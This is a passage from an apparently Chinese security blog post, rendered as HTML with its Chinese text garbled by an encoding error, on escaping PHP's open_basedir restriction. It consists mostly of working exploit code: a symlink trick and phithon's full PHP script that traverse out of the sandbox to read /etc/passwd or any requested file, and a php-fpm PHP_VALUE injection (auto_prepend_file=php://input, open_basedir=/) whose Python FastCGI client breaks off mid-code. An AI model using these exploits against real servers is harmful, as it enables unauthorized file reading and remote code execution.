class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;..&quot;</span>);<br><span class="hljs-title function_ invoke__">symlink</span>(<span class="hljs-string">&quot;A/B/C/D&quot;</span>,<span class="hljs-string">&quot;7ea&quot;</span>);<br><span class="hljs-title function_ invoke__">symlink</span>(<span class="hljs-string">&quot;7ea/../../../../etc/passwd&quot;</span>,<span class="hljs-string">&quot;exp&quot;</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;7ea&quot;</span>);<br><span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&quot;7ea&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>åŸç†ï¼šåˆ›å»ºä¸€ä¸ªé“¾æ¥æ–‡ä»¶7eaï¼Œç”¨ç›¸å¯¹è·¯å¾„æŒ‡å‘A&#x2F;B&#x2F;C&#x2F;Dï¼Œå†åˆ›å»ºä¸€ä¸ªé“¾æ¥æ–‡ä»¶expæŒ‡å‘7ea&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwdã€‚å…¶å®æŒ‡å‘çš„å°±æ˜¯A&#x2F;B&#x2F;C&#x2F;D&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwdï¼Œå…¶å®å°±æ˜¯&#x2F;etc&#x2F;passwdã€‚è¿™æ—¶å€™åˆ é™¤7eaï¼Œå†åˆ›å»ºä¸€ä¸ª7eaç›®å½•ï¼Œä½†expè¿˜æ˜¯æŒ‡å‘7ea&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwdï¼Œæ‰€ä»¥å°±æˆåŠŸè·¨åˆ°&#x2F;etc&#x2F;passwdäº†ã€‚</p>
<p>pç‰›çš„è„šæœ¬</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* by phithon</span><br><span class="hljs-comment">* From https://www.leavesongs.com</span><br><span class="hljs-comment">* detail: http://cxsecurity.com/issue/WLB-2009110068</span><br><span class="hljs-comment">*/</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;content-type: text/plain&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(-<span class="hljs-number">1</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-literal">TRUE</span>);<br><span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;open_basedir: %s\nphp_version: %s\n&quot;</span>, <span class="hljs-title function_ invoke__">ini_get</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>), <span class="hljs-title function_ invoke__">phpversion</span>());<br><span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;disable_functions: %s\n&quot;</span>, <span class="hljs-title function_ invoke__">ini_get</span>(<span class="hljs-string">&#x27;disable_functions&#x27;</span>));<br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) ? <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>] : <span class="hljs-string">&#x27;/etc/passwd&#x27;</span>);<br><span class="hljs-variable">$relat_file</span> = <span class="hljs-title function_ invoke__">getRelativePath</span>(<span class="hljs-keyword">__FILE__</span>, <span class="hljs-variable">$file</span>);<br><span class="hljs-variable">$paths</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$file</span>);<br><span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">mt_rand</span>() % <span class="hljs-number">999</span>;<br><span class="hljs-variable">$exp</span> = <span class="hljs-title function_ invoke__">getRandStr</span>();<br><span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$name</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$name</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">1</span> ; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$paths</span>) - <span class="hljs-number">1</span> ; <span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$paths</span>[<span class="hljs-variable">$i</span>]);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$paths</span>[<span class="hljs-variable">$i</span>]);<br>&#125;<br><span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$paths</span>[<span class="hljs-variable">$i</span>]);<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> -= <span class="hljs-number">1</span>; <span class="hljs-variable">$i</span> &gt; <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span>--) &#123; <br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>&#125;<br><span class="hljs-variable">$paths</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$relat_file</span>);<br><span class="hljs-variable">$j</span> = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$paths</span>[<span class="hljs-variable">$i</span>] == <span class="hljs-string">&#x27;..&#x27;</span>; <span class="hljs-variable">$i</span>++) &#123; <br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$name</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$name</span>);<br>    <span class="hljs-variable">$j</span>++;<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt;= <span class="hljs-variable">$j</span>; <span class="hljs-variable">$i</span>++) &#123; <br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br>&#125;<br><span class="hljs-variable">$tmp</span> = <span class="hljs-title function_ invoke__">array_fill</span>(<span class="hljs-number">0</span>, <span class="hljs-variable">$j</span> + <span class="hljs-number">1</span>, <span class="hljs-variable">$name</span>);<br><span class="hljs-title function_ invoke__">symlink</span>(<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$tmp</span>), <span class="hljs-string">&#x27;tmplink&#x27;</span>);<br><span class="hljs-variable">$tmp</span> = <span class="hljs-title function_ invoke__">array_fill</span>(<span class="hljs-number">0</span>, <span class="hljs-variable">$j</span>, <span class="hljs-string">&#x27;..&#x27;</span>);<br><span class="hljs-title function_ invoke__">symlink</span>(<span class="hljs-string">&#x27;tmplink/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$tmp</span>) . <span class="hljs-variable">$file</span>, <span class="hljs-variable">$exp</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;tmplink&#x27;</span>);<br><span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&#x27;tmplink&#x27;</span>);<br><span class="hljs-title function_ invoke__">delfile</span>(<span class="hljs-variable">$name</span>);<br><span class="hljs-variable">$exp</span> = <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SCRIPT_NAME&#x27;</span>]) . <span class="hljs-string">&quot;/<span class="hljs-subst">&#123;$exp&#125;</span>&quot;</span>;<br><span class="hljs-variable">$exp</span> = <span class="hljs-string">&quot;http://<span class="hljs-subst">&#123;$_SERVER[&#x27;SERVER_NAME&#x27;]&#125;</span><span class="hljs-subst">&#123;$exp&#125;</span>&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n-----------------content---------------\n\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$exp</span>);<br><span class="hljs-title function_ invoke__">delfile</span>(<span class="hljs-string">&#x27;tmplink&#x27;</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getRelativePath</span>(<span class="hljs-params"><span class="hljs-variable">$from</span>, <span class="hljs-variable">$to</span></span>) </span>&#123;<br>  <span class="hljs-comment">// some compatibility fixes for Windows paths</span><br>  <span class="hljs-variable">$from</span> = <span class="hljs-title function_ invoke__">rtrim</span>(<span class="hljs-variable">$from</span>, <span class="hljs-string">&#x27;\/&#x27;</span>) . <span class="hljs-string">&#x27;/&#x27;</span>;<br>  <span class="hljs-variable">$from</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$from</span>);<br>  <span class="hljs-variable">$to</span>   = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$to</span>);<br><br>  <span class="hljs-variable">$from</span>   = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$from</span>);<br>  <span class="hljs-variable">$to</span>     = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$to</span>);<br>  <span class="hljs-variable">$relPath</span>  = <span class="hljs-variable">$to</span>;<br><br>  <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$from</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$depth</span> =&gt; <span class="hljs-variable">$dir</span>) &#123;<br>    <span class="hljs-comment">// find first non-matching dir</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dir</span> === <span class="hljs-variable">$to</span>[<span class="hljs-variable">$depth</span>]) &#123;<br>      <span class="hljs-comment">// ignore this directory</span><br>      <span class="hljs-title function_ invoke__">array_shift</span>(<span class="hljs-variable">$relPath</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-comment">// get number of remaining dirs to $from</span><br>      <span class="hljs-variable">$remaining</span> = <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$from</span>) - <span class="hljs-variable">$depth</span>;<br>      <span class="hljs-keyword">if</span>(<span class="hljs-variable">$remaining</span> &gt; <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-comment">// add traversals up to first matching dir</span><br>        <span class="hljs-variable">$padLength</span> = (<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$relPath</span>) + <span class="hljs-variable">$remaining</span> - <span class="hljs-number">1</span>) * -<span class="hljs-number">1</span>;<br>        <span class="hljs-variable">$relPath</span> = <span class="hljs-title function_ invoke__">array_pad</span>(<span class="hljs-variable">$relPath</span>, <span class="hljs-variable">$padLength</span>, <span class="hljs-string">&#x27;..&#x27;</span>);<br>        <span class="hljs-keyword">break</span>;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$relPath</span>[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;./&#x27;</span> . <span class="hljs-variable">$relPath</span>[<span class="hljs-number">0</span>];<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$relPath</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delfile</span>(<span class="hljs-params"><span class="hljs-variable">$deldir</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span> (@<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$deldir</span>)) &#123;<br>        @<span class="hljs-title function_ invoke__">chmod</span>(<span class="hljs-variable">$deldir</span>,<span class="hljs-number">0777</span>);<br>        <span class="hljs-keyword">return</span> @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$deldir</span>);<br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(@<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$deldir</span>))&#123;<br>        <span class="hljs-keyword">if</span>((<span class="hljs-variable">$mydir</span> = @<span class="hljs-title function_ invoke__">opendir</span>(<span class="hljs-variable">$deldir</span>)) == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">while</span>(<span class="hljs-literal">false</span> !== (<span class="hljs-variable">$file</span> = @<span class="hljs-title function_ invoke__">readdir</span>(<span class="hljs-variable">$mydir</span>)))<br>        &#123;<br>            <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">File_Str</span>(<span class="hljs-variable">$deldir</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file</span>);<br>            <span class="hljs-keyword">if</span>((<span class="hljs-variable">$file</span>!=<span class="hljs-string">&#x27;.&#x27;</span>) &amp;&amp; (<span class="hljs-variable">$file</span>!=<span class="hljs-string">&#x27;..&#x27;</span>))&#123;<span class="hljs-title function_ invoke__">delfile</span>(<span class="hljs-variable">$name</span>);&#125;<br>        &#125; <br>        @<span class="hljs-title function_ invoke__">closedir</span>(<span class="hljs-variable">$mydir</span>);<br>        @<span class="hljs-title function_ invoke__">chmod</span>(<span class="hljs-variable">$deldir</span>,<span class="hljs-number">0777</span>);<br>        <span class="hljs-keyword">return</span> @<span class="hljs-title function_ invoke__">rmdir</span>(<span class="hljs-variable">$deldir</span>) ? <span class="hljs-literal">true</span> : <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">File_Str</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;//&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-variable">$string</span>));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getRandStr</span>(<span class="hljs-params"><span class="hljs-variable">$length</span> = <span class="hljs-number">6</span></span>) </span>&#123;<br>    <span class="hljs-variable">$chars</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br>    <span class="hljs-variable">$randStr</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$randStr</span> .= <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$chars</span>, <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$chars</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$randStr</span>;<br>&#125;<br></code></pre></td></tr></table></figure>



<h1 id="php-fpm"><a href="#php-fpm" class="headerlink" title="php-fpm"></a>php-fpm</h1><p>åŠ ä¸Šå¯¹ open_basedir çš„é‡è®¾</p>
<p><code>&#39;PHP_VALUE&#39;: &#39;auto_prepend_file = php://input&#39;+chr(0x0A)+&#39;open_basedir = /&#39;,</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><br><span class="hljs-comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span><br><br>PY2 = <span class="hljs-literal">True</span> <span class="hljs-keyword">if</span> sys.version_info.major == <span class="hljs-number">2</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bchr</span>(<span class="hljs-params">i</span>):<br>    <span class="hljs-keyword">if</span> PY2:<br>        <span class="hljs-keyword">return</span> force_bytes(<span class="hljs-built_in">chr</span>(i))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([i])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bord</span>(<span class="hljs-params">c</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(c, <span class="hljs-built_in">int</span>):<br>        <span class="hljs-keyword">return</span> c<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">ord</span>(c)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">force_bytes</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(s, <span class="hljs-built_in">bytes</span>):<br>        <span class="hljs-keyword">return</span> s<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> s.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, <span class="hljs-string">&#x27;strict&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">force_text</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">issubclass</span>(<span class="hljs-built_in">type</span>(s), <span class="hljs-built_in">str</span>):<br>        <span class="hljs-keyword">return</span> s<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(s, <span class="hljs-built_in">bytes</span>):<br>        s = <span class="hljs-built_in">str</span>(s, <span class="hljs-string">&#x27;utf-8&#x27;</span>, <span class="hljs-string">&#x27;strict&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        s = <span class="hljs-built_in">str</span>(s)<br>    <span class="hljs-keyword">return</span> s<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">FastCGIClient</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;</span><br><br>    <span class="hljs-comment"># private</span><br>    __FCGI_VERSION = <span class="hljs-number">1</span><br><br>    __FCGI_ROLE_RESPONDER = <span class="hljs-number">1</span><br>    __FCGI_ROLE_AUTHORIZER = <span class="hljs-number">2</span><br>    __FCGI_ROLE_FILTER = <span class="hljs-number">3</span><br><br>    __FCGI_TYPE_BEGIN = <span class="hljs-number">1</span><br>    __FCGI_TYPE_ABORT = <span class="hljs-number">2</span><br>    __FCGI_TYPE_END = <span class="hljs-number">3</span><br>    __FCGI_TYPE_PARAMS = <span class="hljs-number">4</span><br>    __FCGI_TYPE_STDIN = <span class="hljs-number">5</span><br>    __FCGI_TYPE_STDOUT = <span class="hljs-number">6</span><br>    __FCGI_TYPE_STDERR = <span class="hljs-number">7</span><br>    __FCGI_TYPE_DATA = <span class="hljs-number">8</span><br>    __FCGI_TYPE_GETVALUES = <span class="hljs-number">9</span><br>    __FCGI_TYPE_GETVALUES_RESULT = <span class="hljs-number">10</span><br>    __FCGI_TYPE_UNKOWNTYPE = <span class="hljs-number">11</span><br><br>    __FCGI_HEADER_SIZE = <span class="hljs-number">8</span><br><br>    <span class="hljs-comment"># request state</span><br>    FCGI_STATE_SEND = <span class="hljs-number">1</span><br>    FCGI_STATE_ERROR = <span class="hljs-number">2</span><br>    FCGI_STATE_SUCCESS = <span class="hljs-number">3</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, host, port, timeout, keepalive</span>):<br>        self.host = host<br>        self.port = port<br>        self.timeout = timeout<br>        <span class="hljs-keyword">if</span> keepalive:<br>            self.keepalive = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            self.keepalive = <span class="hljs-number">0</span><br>        self.sock = <span class="hljs-literal">None</span><br>        self.requests = <span class="hljs-built_in">dict</span>()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__connect</span>(<span class="hljs-params">self</span>):<br>        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        self.sock.settimeout(self.timeout)<br>        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)<br>        <span class="hljs-comment"># if self.keepalive:</span><br>        <span class="hljs-comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span><br>        <span class="hljs-comment"># else:</span><br>        <span class="hljs-comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span><br>        <span class="hljs-keyword">try</span>:<br>            self.sock.connect((self.host, <span class="hljs-built_in">int</span>(self.port)))<br>        <span class="hljs-keyword">except</span> socket.error <span class="hljs-keyword">as</span> msg:<br>            self.sock.close()<br>            self.sock = <span class="hljs-literal">None</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">repr</span>(msg))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__encodeFastCGIRecord</span>(<span class="hljs-params">self, fcgi_type, content, requestid</span>):<br>        length = <span class="hljs-built_in">len</span>(content)<br>        buf = bchr(FastCGIClient.__FCGI_VERSION) \<br>               + bchr(fcgi_type) \<br>               + bchr((requestid &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>               + bchr(requestid &amp; <span class="hljs-number">0xFF</span>) \<br>               + bchr((length &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>               + bchr(length &amp; <span class="hljs-number">0xFF</span>) \<br>               + bchr(<span class="hljs-number">0</span>) \<br>               + bchr(<span class="hljs-number">0</span>) \<br>               + content<br>        <span class="hljs-keyword">return</span> buf<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__encodeNameValueParams</span>(<span class="hljs-params">self, name, value</span>):<br>        nLen = <span class="hljs-built_in">len</span>(name)<br>        vLen = <span class="hljs-built_in">len</span>(value)<br>        record = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">if</span> nLen &lt; <span class="hljs-number">128</span>:<br>            record += bchr(nLen)<br>        <span class="hljs-keyword">else</span>:<br>            record += bchr((nLen &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) \<br>                      + bchr((nLen &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + bchr((nLen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + bchr(nLen &amp; <span class="hljs-number">0xFF</span>)<br>        <span class="hljs-keyword">if</span> vLen &lt; <span class="hljs-number">128</span>:<br>            record += bchr(vLen)<br>        <span class="hljs-keyword">else</span>:<br>            record += bchr((vLen &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) \<br>                      + bchr((vLen &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + bchr((vLen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + bchr(vLen &amp; <span class="hljs-number">0xFF</span>)<br>        <span class="hljs-keyword">return</span> record + name + value<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__decodeFastCGIHeader</span>(<span class="hljs-params">self, stream</span>):<br>        header = <span class="hljs-built_in">dict</span>()<br>        header[<span class="hljs-string">&#x27;version&#x27;</span>] = bord(stream[<span class="hljs-number">0</span>])<br>        header[<span class="hljs-string">&#x27;type&#x27;</span>] = bord(stream[<span class="hljs-number">1</span>])<br>        header[<span class="hljs-string">&#x27;requestId&#x27;</span>] = (bord(stream[<span class="hljs-number">2</span>]) &lt;&lt; <span class="hljs-number">8</span>) + bord(stream[<span class="hljs-number">3</span>])<br>        header[<span class="hljs-string">&#x27;contentLength&#x27;</span>] = (bord(stream[<span class="hljs-number">4</span>]) &lt;&lt; <span class="hljs-number">8</span>) + bord(stream[<span class="hljs-number">5</span>])<br>        header[<span class="hljs-string">&#x27;paddingLength&#x27;</span>] = bord(stream[<span class="hljs-number">6</span>])<br>        header[<span class="hljs-string">&#x27;reserved&#x27;</span>] = bord(stream[<span class="hljs-number">7</span>])<br>        <span class="hljs-keyword">return</span> header<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__decodeFastCGIRecord</span>(<span class="hljs-params">self, buffer</span>):<br>        header = buffer.read(<span class="hljs-built_in">int</span>(self.__FCGI_HEADER_SIZE))<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> header:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">else</span>:<br>            record = self.__decodeFastCGIHeader(header)<br>            record[<span class="hljs-string">&#x27;content&#x27;</span>] = <span class="hljs-string">b&#x27;&#x27;</span><br>            <br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;contentLength&#x27;</span> <span class="hljs-keyword">in</span> record.keys():<br>                contentLength = <span class="hljs-built_in">int</span>(record[<span class="hljs-string">&#x27;contentLength&#x27;</span>])<br>                record[<span class="hljs-string">&#x27;content&#x27;</span>] += buffer.read(contentLength)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;paddingLength&#x27;</span> <span class="hljs-keyword">in</span> record.keys():<br>                skiped = buffer.read(<span class="hljs-built_in">int</span>(record[<span class="hljs-string">&#x27;paddingLength&#x27;</span>]))<br>            <span class="hljs-keyword">return</span> record<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">request</span>(<span class="hljs-params">self, nameValuePairs=&#123;&#125;, post=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.__connect():<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;connect failure! please check your fasctcgi-server !!&#x27;</span>)<br>            <span class="hljs-keyword">return</span><br><br>        requestId = random.randint(<span class="hljs-number">1</span>, (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">16</span>) - <span class="hljs-number">1</span>)<br>        self.requests[requestId] = <span class="hljs-built_in">dict</span>()<br>        request = <span class="hljs-string">b&quot;&quot;</span><br>        beginFCGIRecordContent = bchr(<span class="hljs-number">0</span>) \<br>                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \<br>                                 + bchr(self.keepalive) \<br>                                 + bchr(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span><br>        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,<br>                                              beginFCGIRecordContent, requestId)<br>        paramsRecord = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">if</span> nameValuePairs:<br>            <span class="hljs-keyword">for</span> (name, value) <span class="hljs-keyword">in</span> nameValuePairs.items():<br>                name = force_bytes(name)<br>                value = force_bytes(value)<br>                paramsRecord += self.__encodeNameValueParams(name, value)<br><br>        <span class="hljs-keyword">if</span> paramsRecord:<br>            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)<br>        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="hljs-string">b&#x27;&#x27;</span>, requestId)<br><br>        <span class="hljs-keyword">if</span> post:<br>            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)<br>        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="hljs-string">b&#x27;&#x27;</span>, requestId)<br><br>        self.sock.send(request)<br>        self.requests[requestId][<span class="hljs-string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_SEND<br>        self.requests[requestId][<span class="hljs-string">&#x27;response&#x27;</span>] = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">return</span> self.__waitForResponse(requestId)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__waitForResponse</span>(<span class="hljs-params">self, requestId</span>):<br>        data = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            buf = self.sock.recv(<span class="hljs-number">512</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">len</span>(buf):<br>                <span class="hljs-keyword">break</span><br>            data += buf<br><br>        data = BytesIO(data)<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            response = self.__decodeFastCGIRecord(data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> response:<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == 